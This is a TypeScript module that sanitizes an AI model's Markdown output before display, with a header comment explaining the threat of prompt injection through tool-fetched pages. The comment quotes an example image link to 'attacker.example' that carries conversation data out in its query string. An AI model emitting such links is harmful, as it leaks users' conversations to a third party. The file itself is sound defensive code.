import DOMPurify from 'dompurify';
import { Marked } from 'marked';

/**
 * Markdown → sanitized HTML for assistant messages (browser only: DOMPurify needs a DOM).
 *
 * Model output is untrusted: a page fetched by a tool can inject instructions
 * that make the model emit HTML. So:
 *   - everything is sanitized with DOMPurify (no scripts, event handlers or `javascript:` URLs);
 *   - images are rendered as links, never loaded: an auto-loading
 *     `![](https://attacker.example/?q=<conversation data>)` would leak data
 *     without any user action;
 *   - links open in a new tab without referrer or opener.
 */

const escapeHtml = (text: string) => text.replace(/[&<>"']/g, (c) => `&#${c.charCodeAt(0)};`);

const marked = new Marked({
	gfm: true, // tables, strikethrough, autolinks, task lists
	breaks: true, // single newlines become <br>, as chat users expect
	async: false,
	renderer: {
		image({ href, text }) {
			return `<a href="${escapeHtml(href)}">🖼 ${escapeHtml(text || href)}</a>`;
		}
	}
});

const PURIFY_CONFIG = {
	USE_PROFILES: { html: true },
	FORBID_TAGS: ['img', 'style', 'form', 'input', 'button', 'textarea', 'select'],
	FORBID_ATTR: ['style']
};

let hookInstalled = false;

export function renderMarkdown(markdown: string): string {
	if (!hookInstalled) {
		DOMPurify.addHook('afterSanitizeAttributes', (node) => {
			if (node.tagName === 'A') {
				node.setAttribute('target', '_blank');
				node.setAttribute('rel', 'noopener noreferrer nofollow');
			}
		});
		hookInstalled = true;
	}
	const html = marked.parse(markdown) as string;
	return DOMPurify.sanitize(html, PURIFY_CONFIG);
}
